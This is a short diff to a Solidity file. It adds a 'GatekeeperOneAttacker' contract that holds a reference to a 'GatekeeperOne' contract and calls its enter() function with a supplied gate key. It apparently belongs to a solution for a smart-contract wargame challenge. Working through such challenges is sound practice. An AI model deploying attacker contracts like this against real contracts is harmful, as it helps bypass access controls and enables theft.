@@ -37,3 +37,16 @@ contract GatekeeperOne {
         return true;
     }
 }
+
+contract GatekeeperOneAttacker {
+    GatekeeperOne gatekeeperContract;
+
+    constructor (GatekeeperOne _contract){
+        gatekeeperContract = _contract;
+    }
+
+    function attack (bytes8 _gateKey) public {
+        gatekeeperContract.enter(_gateKey);
+    }
+
+}
